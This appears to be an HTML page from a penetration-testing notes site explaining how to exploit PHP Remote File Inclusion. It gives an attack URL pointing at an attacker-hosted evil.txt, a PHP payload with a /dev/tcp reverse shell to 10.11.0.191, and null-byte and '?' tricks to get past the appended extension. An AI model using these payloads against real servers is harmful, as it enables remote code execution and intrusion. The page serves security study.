@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="xapax">
+    
+    <link rel="shortcut icon" href="../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Remote File Inclusion - Notes</title>
+    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Remote File Inclusion", url: "#_top", children: [
+              {title: "Avoid extentions", url: "#avoid-extentions" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../nosql-injections/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../nosql-injections/" class="btn btn-xs btn-link">
+        NoSQL Injection
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../session-fixation/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../session-fixation/" class="btn btn-xs btn-link">
+        Session Fixation
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="remote-file-inclusion">Remote File Inclusion<a class="headerlink" href="#remote-file-inclusion" title="Permanent link">#</a></h1>
+<p>Remote file inclusion uses pretty much the same vector as local file inclusion.</p>
+<p>A remote file inclusion vulnerability lets the attacker execute a script on the target-machine even though it is not even hosted on that machine. </p>
+<p>RFI's are less common than LFI. Because in order to get them to work the developer must have edited the <code>php.ini</code> configuration file.</p>
+<p>This is how they work.</p>
+<p>So you have an unsanitized parameter, like this</p>
+<pre><code>$incfile = $_REQUEST[&quot;file&quot;];
+include($incfile.&quot;.php&quot;);
+</code></pre>
+
+<p>Now what you can do is to include a file that is not hosted on the victim-server, but instead on the attackers server.</p>
+<pre><code>http://exampe.com/index.php?page=http://attackerserver.com/evil.txt
+</code></pre>
+
+<p>And evil.txt will look like something like this:</p>
+<pre><code>&lt;?php echo shell_exec(&quot;whoami&quot;);?&gt;
+
+# Or just get a reverse shell directly like this:
+&lt;?php echo system(&quot;0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/10.11.0.191/443; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196&quot;); ?&gt;
+
+</code></pre>
+
+<p>So when the victim-server includes this file it will automatically execute the commands that are in the evil.txt file. And we have a RCE.</p>
+<h2 id="avoid-extentions">Avoid extentions<a class="headerlink" href="#avoid-extentions" title="Permanent link">#</a></h2>
+<p>Remember to add the nullbyte <code>%00</code> to avoid appending <code>.php</code>. This will only work on php before version 5.3. </p>
+<p>If it does not work you can also add a <code>?</code>, this way the rest will be interpreted as url parameters.</p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../nosql-injections/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../nosql-injections/" class="btn btn-xs btn-link">
+        NoSQL Injection
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../session-fixation/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../session-fixation/" class="btn btn-xs btn-link">
+        Session Fixation
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+      <p>
+        <a href="https://github.com/xapax/edit/master/docs/attacking_web_applications/remote_file_inclusion.md"><i class="fa fa-github"></i>
+Edit on GitHub</a>
+      </p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
